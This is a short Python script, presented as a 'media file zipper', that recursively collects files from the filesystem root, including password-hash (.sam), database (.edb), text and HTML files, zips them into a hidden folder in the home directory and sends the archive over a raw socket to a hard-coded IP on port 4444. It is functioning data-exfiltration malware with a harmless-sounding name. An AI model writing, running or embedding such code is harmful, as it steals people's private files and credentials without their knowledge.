import os
import socket
import zipfile
import traceback
import threading

class MediaFileZipper:
    def __init__(self, root_directory, media_extensions, zip_file_path):
        self.root_directory = root_directory
        self.media_extensions = media_extensions
        self.zip_file_path = zip_file_path

    def zip_media_files(self):
        with zipfile.ZipFile(self.zip_file_path, 'w') as zip_file:
            try:
                # Walk through every directory and file in the root directory
                for directory_path, directory_names, file_names in os.walk(self.root_directory):
                    # Filter the files by extension
                    media_files = [os.path.join(directory_path, file_name) for file_name in file_names if os.path.splitext(file_name)[1] in self.media_extensions]
                    # Add the media files to the zip file
                    for media_file in media_files:
                        try:
                            zip_file.write(media_file)
                        except PermissionError:
                            print(f"Permission denied for file {media_file}")
                        except FileNotFoundError:
                            print(f"File not found {media_file}")
            except Exception:
                traceback.print_exc()

class MediaFileSender:
    def __init__(self, ip_address, port, zip_file_path):
        self.ip_address = ip_address
        self.port = port
        self.zip_file_path = zip_file_path

    def send_media_files(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((self.ip_address, self.port))
                with open(self.zip_file_path, 'rb') as file:
                    data = file.read()
                    sock.sendall(data)
        except Exception:
            traceback.print_exc()

if __name__ == "__main__":
    # Get the root directory
    root_directory = os.path.abspath('/')
    # Set the media extensions to filter
    media_extensions = [".mp3", ".mp4", ".wav", ".avi", ".jpg", ".jpeg", ".text", ".txt", ".sam", ".html", ".htm", ".edb"]
    # Create a ZipFile object to save the media files to
    zip_file_path = os.path.join(os.path.expanduser("~"), ".hidden", ".media_files.zip")
    if not os.path.exists(os.path.dirname(zip_file_path)):
        os.makedirs(os.path.dirname(zip_file_path))

    media_file_zipper = MediaFileZipper(root_directory, media_extensions, zip_file_path)
    media_file_sender = MediaFileSender('172.18.50.74', 4444, zip_file_path)

    # Zip media files and send them to the server asynchronously
    zip_thread = threading.Thread(target=media_file_zipper.zip_media_files)
    send_thread = threading.Thread(target=media_file_sender.send_media_files)

    zip_thread.start()
    send_thread.start()

    zip_thread.join()
    send_thread.join()
